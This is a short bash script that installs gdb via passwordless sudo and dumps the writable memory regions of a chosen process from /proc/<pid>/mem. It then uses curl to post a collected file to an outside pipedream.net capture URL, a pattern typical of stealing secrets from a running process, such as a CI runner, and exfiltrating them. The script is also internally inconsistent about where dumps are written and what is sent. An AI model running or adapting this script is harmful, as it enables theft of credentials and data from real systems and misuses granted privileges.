#!/bin/bash

# install gdb sudo is passwordless according to doc
sudo apt-get install gdb -y > /tmp/file.txt

mkdir dumps
echo "STARTING..." >> /tmp/file.txt

cat /proc/$1/maps | grep "rw-p" | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done ) >> /tmp/file.txt

echo "FINISHED..." >> /tmp/file.txt

rm -rf dumps/

curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
